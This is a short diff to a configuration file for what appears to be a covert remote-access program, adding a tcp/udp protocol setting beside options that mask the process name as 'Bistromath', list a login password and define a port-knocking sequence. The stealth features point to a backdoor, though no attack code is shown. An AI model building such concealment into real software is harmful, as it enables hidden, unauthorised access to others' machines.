@@ -3,6 +3,10 @@
 # The name which will be used in masking the process name. 
 mask = "Bistromath"
 
+# The protocol on which packets are sent and received
+# Supported protocols include tcp and udp
+protocol = "tcp"
+
 # A list of valid passwords which can be used to autheticate when connecting to this program.
 passwords = ["open"]
 # A list of port numbers which must be used in sequence as a port knock when connecting to this program.
